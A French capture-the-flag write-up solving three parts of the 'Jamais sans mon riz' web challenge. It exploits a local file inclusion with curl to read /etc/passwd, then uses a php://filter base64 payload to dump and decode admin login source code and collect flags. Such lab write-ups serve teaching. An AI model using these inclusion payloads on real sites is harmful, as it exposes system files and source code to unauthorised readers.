# JAMAIS SANS MON RIZ 1 - 100 points

!["photo du site"](https://i.imgur.com/tD0jlY3.png)

URL de base site fourni : `http://www.jamaissansmonriz.com/`

Pour la 1ère Partie de cette suite de challenges, le 1er flag ce trouve dans le fichier "robots.txt" :

![](https://i.imgur.com/hcsHxs0.png)

1er FLAG : `FLAG{1_dur_dur_detre_un_robot}`



# JAMAIS SANS MON RIZ 2 - 200 points

Une fois le fichier "robots.txt", on voit dans celui-ci que le dossier "/admin/" est interdit d'accès à tous les robots (pour éviter que la ressource soit indexé).

On va donc jeter un oeil dessus :

![](https://i.imgur.com/wQT3dtV.png)

On voit une page d'authenfication pour les admins.

Avant d'essayer quoi que ce soit sur la page d'authentification, je retourne en arrière pour voir si il n'y aurai pas quelques choses d'intéréssant auquel je serai passé à côté.

Et que voilà-je ? ~~le V~~   :

![](https://i.imgur.com/IwNTwXf.png)

En parcourant différent post on voit le paramètre `?postid=` prennant comme valeur `posts/1.php`, tiens tiens on dirai bien qu'on à la une LFI.

On test donc d'inclure `/etc/passwd` pour voir et bingo :

```
$ curl http://www.jamaissansmonriz.com/post.php?postid=/etc/passwd
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Clean Blog - Start Bootstrap Theme</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="css/styles.css" rel="stylesheet" />
    </head>
    <body>

        
        <!-- Navigation-->
        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
            <div class="container px-4 px-lg-5">
                <a class="navbar-brand" href="#Comme du riz haha t'as pognes-tu?">Le repas est servi, souRIZ!</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                    Menu
                    <i class="fas fa-bars"></i>
                </button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.php">Accueil</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.php">À propos</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="contact.php">Nous Joindre</a></li>
                    </ul>
                </div>
            </div>
        </nav>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
admin:x:1000:1000::/home/admin:/bin/sh

<!-- Footer-->
<footer class="border-top">
            <div class="container px-4 px-lg-5">
                <div class="row gx-4 gx-lg-5 justify-content-center">
                    <div class="col-md-10 col-lg-8 col-xl-7">
                        <ul class="list-inline text-center">
                            <li class="list-inline-item">
                                <a href="#!">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="#!">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="#!">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                        </ul>
                        <div class="small text-center text-muted fst-italic">Copyright &copy; Ettic 2022 </div>
                    </div>
                </div>
            </div>
        </footer>        
        <!-- Bootstrap core JS-->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>

```

On sait maintenant qu'on peut inclure n'importe quel fichier du serveur à condition d'avoir les droits de lecture.

Cependant on ne peut pas lire un fichier `.php` directement car celui-ci sera exécuté.

Pour lire un fichier `.php` il faut utiliser les filtres et dans notre cas on va lire le fichier : `admin/login.php` qui correspond à la page d'authentification pour les admins trouvé grâve au fichier `robots.txt`.

Le payload à passer au paramètre sera celui-ci : `php://filter/convert.base64-encode/resource=admin/login.php`:

```
$ curl http://www.jamaissansmonriz.com/post.php?postid=php://filter/convert.base64-encode/resource=admin/login.php
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Clean Blog - Start Bootstrap Theme</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.15.4/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="css/styles.css" rel="stylesheet" />
    </head>
    <body>

        
        <!-- Navigation-->
        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
            <div class="container px-4 px-lg-5">
                <a class="navbar-brand" href="#Comme du riz haha t'as pognes-tu?">Le repas est servi, souRIZ!</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                    Menu
                    <i class="fas fa-bars"></i>
                </button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.php">Accueil</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.php">À propos</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="contact.php">Nous Joindre</a></li>
                    </ul>
                </div>
            </div>
        </nav>
PD9waHAKCi8vIEZMQUd7Ml9qZV9tZV9zZW5zX3RlbGxlbWVudF9pbmNsdX0KCmluY2x1ZGVfb25jZSgibGliL2NyeXB0by5waHAiKTsKc2Vzc2lvbl9zdGFydCgpOwoKaWYoaXNzZXQoJF9TRVNTSU9OWyJhZG1pbiJdKSAmJiAkX1NFU1NJT05bImFkbWluIl0pIHsKICAgIGhlYWRlcigiTG9jYXRpb246IC9hZG1pbi9pbmRleC5waHAiKTsKICAgIGV4aXQoKTsKfQoKLy8gVmFsaWRhdGUgUmVtZW1iZXIgTWUKaWYoaXNzZXQoJF9DT09LSUVbInJlbWVtYmVyX21lIl0pKSB7CiAgICBpZiAoJHJlbWVtYmVyX21lID0gdmFsaWRhdGVfcmVtZW1iZXJfbWVfY29va2llKCRfQ09PS0lFWyJyZW1lbWJlcl9tZSJdKSkgewogICAgICAgICRfU0VTU0lPTlsiYWRtaW4iXSA9IHRydWU7CiAgICAgICAgJF9TRVNTSU9OWyJ1c2VybmFtZSJdID0gImFkbWluIjsKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvYWRtaW4vaW5kZXgucGhwIik7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CgoKLy8gVmFsaWRhdGUgbG9naW4KCmlmKGlzc2V0KCRfUE9TVFsiZW1haWwiXSkgJiYgaXNzZXQoJF9QT1NUWyJwYXNzd29yZCJdKSkgewogICAgLy8gVE9ETzogQWpvdXRlciB1bmUgYmFzZSBkZSBkb25uZWVzLCBjb21tZSBjYSBvbiBuZSByaXogcGx1cwogICAgaWYoJF9QT1NUWyJlbWFpbCJdID09PSAiYWRtaW5AamFtYWlzc2Fuc21vbnJpei5jb20iICYmICRfUE9TVFsicGFzc3dvcmQiXSA9PT0gZ2V0ZW52KCJGTEFHNCIpKSB7CiAgICAgICAgCiAgICAgICAgJF9TRVNTSU9OWyJhZG1pbiJdID0gdHJ1ZTsKICAgICAgICAkX1NFU1NJT05bInVzZXJuYW1lIl0gPSAiYWRtaW4iOwoKICAgICAgICBpZihpc3NldCgkX1BPU1RbInJlbWVtYmVyX21lIl0pICYmICRfUE9TVFsicmVtZW1iZXJfbWUiXSA9PT0gIm9uIikgewogICAgICAgICAgICBzZXRjb29raWUoInJlbWVtYmVyX21lIiwgZ2VuZXJhdGVfcmVtZW1iZXJfbWVfY29va2llKCRfU0VTU0lPTlsidXNlcm5hbWUiXSwgIjEiKSwgdGltZSgpKzM2MDAqMjQqMzAsICIvIiwgIiIsIDApOwogICAgICAgIH0gICAKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvYWRtaW4vaW5kZXgucGhwIik7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CgoKCj8+CgoKPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KCjxoZWFkPgoKICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiI+CgogICAgPHRpdGxlPlNCIEFkbWluIDIgLSBMb2dpbjwvdGl0bGU+CgogICAgPCEtLSBDdXN0b20gZm9udHMgZm9yIHRoaXMgdGVtcGxhdGUtLT4KICAgIDxsaW5rIGhyZWY9InZlbmRvci9mb250YXdlc29tZS1mcmVlL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+CiAgICA8bGluawogICAgICAgIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1OdW5pdG86MjAwLDIwMGksMzAwLDMwMGksNDAwLDQwMGksNjAwLDYwMGksNzAwLDcwMGksODAwLDgwMGksOTAwLDkwMGkiCiAgICAgICAgcmVsPSJzdHlsZXNoZWV0Ij4KCiAgICA8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUtLT4KICAgIDxsaW5rIGhyZWY9ImNzcy9zYi1hZG1pbi0yLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCI+Cgo8L2hlYWQ+Cgo8Ym9keSBjbGFzcz0iYmctZ3JhZGllbnQtcHJpbWFyeSI+CgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCiAgICAgICAgPCEtLSBPdXRlciBSb3cgLS0+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IGp1c3RpZnktY29udGVudC1jZW50ZXIiPgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhsLTEwIGNvbC1sZy0xMiBjb2wtbWQtOSI+CgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBvLWhpZGRlbiBib3JkZXItMCBzaGFkb3ctbGcgbXktNSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IHAtMCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDwhLS0gTmVzdGVkIFJvdyB3aXRoaW4gQ2FyZCBCb2R5IC0tPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTYgZC1ub25lIGQtbGctYmxvY2sgYmctbG9naW4taW1hZ2UiPjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTYiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InAtNSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRleHQtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMSBjbGFzcz0iaDQgdGV4dC1ncmF5LTkwMCBtYi00Ij5XZWxjb21lIEJhY2shPC9oMT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGNsYXNzPSJ1c2VyIiBhY3Rpb249ImxvZ2luLnBocCIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJlbWFpbCIgdHlwZT0iZW1haWwiIGNsYXNzPSJmb3JtLWNvbnRyb2wgZm9ybS1jb250cm9sLXVzZXIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlkPSJleGFtcGxlSW5wdXRFbWFpbCIgYXJpYS1kZXNjcmliZWRieT0iZW1haWxIZWxwIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0iYWRtaW5AamFtYWlzc2Fuc21vbnJpei5jb20iIHJlcXVpcmVkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIGZvcm0tY29udHJvbC11c2VyIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZD0iZXhhbXBsZUlucHV0UGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImN1c3RvbS1jb250cm9sIGN1c3RvbS1jaGVja2JveCBzbWFsbCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBuYW1lPSJyZW1lbWJlcl9tZSIgdHlwZT0iY2hlY2tib3giIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCIgaWQ9ImN1c3RvbUNoZWNrIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjdXN0b20tY29udHJvbC1sYWJlbCIgZm9yPSJjdXN0b21DaGVjayI+UmVtZW1iZXIgTWU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IGJ0bi11c2VyIGJ0bi1ibG9jayIgdmFsdWU9IkxvZ2luIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgPC9kaXY+CgogICAgPC9kaXY+CgogICAgPCEtLSBCb290c3RyYXAgY29yZSBKYXZhU2NyaXB0LS0+CiAgICA8c2NyaXB0IHNyYz0idmVuZG9yL2pxdWVyeS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3IvYm9vdHN0cmFwL2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KCiAgICA8IS0tIENvcmUgcGx1Z2luIEphdmFTY3JpcHQtLT4KICAgIDxzY3JpcHQgc3JjPSJ2ZW5kb3IvanF1ZXJ5LWVhc2luZy9qcXVlcnkuZWFzaW5nLm1pbi5qcyI+PC9zY3JpcHQ+CgogICAgPCEtLSBDdXN0b20gc2NyaXB0cyBmb3IgYWxsIHBhZ2VzLS0+CiAgICA8c2NyaXB0IHNyYz0ianMvc2ItYWRtaW4tMi5taW4uanMiPjwvc2NyaXB0PgoKPC9ib2R5PgoKPC9odG1sPg==
<!-- Footer-->
<footer class="border-top">
            <div class="container px-4 px-lg-5">
                <div class="row gx-4 gx-lg-5 justify-content-center">
                    <div class="col-md-10 col-lg-8 col-xl-7">
                        <ul class="list-inline text-center">
                            <li class="list-inline-item">
                                <a href="#!">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="#!">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li class="list-inline-item">
                                <a href="#!">
                                    <span class="fa-stack fa-lg">
                                        <i class="fas fa-circle fa-stack-2x"></i>
                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                        </ul>
                        <div class="small text-center text-muted fst-italic">Copyright &copy; Ettic 2022 </div>
                    </div>
                </div>
            </div>
        </footer>        
        <!-- Bootstrap core JS-->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
        <!-- Core theme JS-->
        <script src="js/scripts.js"></script>
    </body>
</html>

```

Le contenu du fichier `admin/login.php` est encodé en base64, il suffit de décoder tout ca :

```
$ echo -n 'PD9waHAKCi8vIEZMQUd7Ml9qZV9tZV9zZW5zX3RlbGxlbWVudF9pbmNsdX0KCmluY2x1ZGVfb25jZSgibGliL2NyeXB0by5waHAiKTsKc2Vzc2lvbl9zdGFydCgpOwoKaWYoaXNzZXQoJF9TRVNTSU9OWyJhZG1pbiJdKSAmJiAkX1NFU1NJT05bImFkbWluIl0pIHsKICAgIGhlYWRlcigiTG9jYXRpb246IC9hZG1pbi9pbmRleC5waHAiKTsKICAgIGV4aXQoKTsKfQoKLy8gVmFsaWRhdGUgUmVtZW1iZXIgTWUKaWYoaXNzZXQoJF9DT09LSUVbInJlbWVtYmVyX21lIl0pKSB7CiAgICBpZiAoJHJlbWVtYmVyX21lID0gdmFsaWRhdGVfcmVtZW1iZXJfbWVfY29va2llKCRfQ09PS0lFWyJyZW1lbWJlcl9tZSJdKSkgewogICAgICAgICRfU0VTU0lPTlsiYWRtaW4iXSA9IHRydWU7CiAgICAgICAgJF9TRVNTSU9OWyJ1c2VybmFtZSJdID0gImFkbWluIjsKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvYWRtaW4vaW5kZXgucGhwIik7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CgoKLy8gVmFsaWRhdGUgbG9naW4KCmlmKGlzc2V0KCRfUE9TVFsiZW1haWwiXSkgJiYgaXNzZXQoJF9QT1NUWyJwYXNzd29yZCJdKSkgewogICAgLy8gVE9ETzogQWpvdXRlciB1bmUgYmFzZSBkZSBkb25uZWVzLCBjb21tZSBjYSBvbiBuZSByaXogcGx1cwogICAgaWYoJF9QT1NUWyJlbWFpbCJdID09PSAiYWRtaW5AamFtYWlzc2Fuc21vbnJpei5jb20iICYmICRfUE9TVFsicGFzc3dvcmQiXSA9PT0gZ2V0ZW52KCJGTEFHNCIpKSB7CiAgICAgICAgCiAgICAgICAgJF9TRVNTSU9OWyJhZG1pbiJdID0gdHJ1ZTsKICAgICAgICAkX1NFU1NJT05bInVzZXJuYW1lIl0gPSAiYWRtaW4iOwoKICAgICAgICBpZihpc3NldCgkX1BPU1RbInJlbWVtYmVyX21lIl0pICYmICRfUE9TVFsicmVtZW1iZXJfbWUiXSA9PT0gIm9uIikgewogICAgICAgICAgICBzZXRjb29raWUoInJlbWVtYmVyX21lIiwgZ2VuZXJhdGVfcmVtZW1iZXJfbWVfY29va2llKCRfU0VTU0lPTlsidXNlcm5hbWUiXSwgIjEiKSwgdGltZSgpKzM2MDAqMjQqMzAsICIvIiwgIiIsIDApOwogICAgICAgIH0gICAKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvYWRtaW4vaW5kZXgucGhwIik7CiAgICAgICAgZXhpdCgpOwogICAgfQp9CgoKCj8'|base64 -d
<?php

// FLAG{2_je_me_sens_tellement_inclu}

include_once("lib/crypto.php");
session_start();

if(isset($_SESSION["admin"]) && $_SESSION["admin"]) {
    header("Location: /admin/index.php");
    exit();
}

// Validate Remember Me
if(isset($_COOKIE["remember_me"])) {
    if ($remember_me = validate_remember_me_cookie($_COOKIE["remember_me"])) {
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";
        header("Location: /admin/index.php");
        exit();
    }
}


// Validate login

if(isset($_POST["email"]) && isset($_POST["password"])) {
    // TODO: Ajouter une base de donnees, comme ca on ne riz plus
    if($_POST["email"] === "admin@jamaissansmonriz.com" && $_POST["password"] === getenv("FLAG4")) {
        
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";

        if(isset($_POST["remember_me"]) && $_POST["remember_me"] === "on") {
            setcookie("remember_me", generate_remember_me_cookie($_SESSION["username"], "1"), time()+3600*24*30, "/", "", 0);
        }   
        header("Location: /admin/index.php");
        exit();
    }
}

```

On a maintenant le 2ème flag : `FLAG{2_je_me_sens_tellement_inclu}`.



# JAMAIS SANS MON RIZ 3 - 300 points

Après avoir lu le fichier `admin/login.php`, on voit que l'utilisateur qui s'authenfie sera rédirigé vers `/admin/index.php`.

On va donc essayer d'y accéder via la LFI :

![](https://i.imgur.com/GS1BJ1j.png)

Bingo, 3ème partie validé ! 3ème flag : `FLAG{3_you_get_a_token_you_get_a_token_you_get_a_token} `
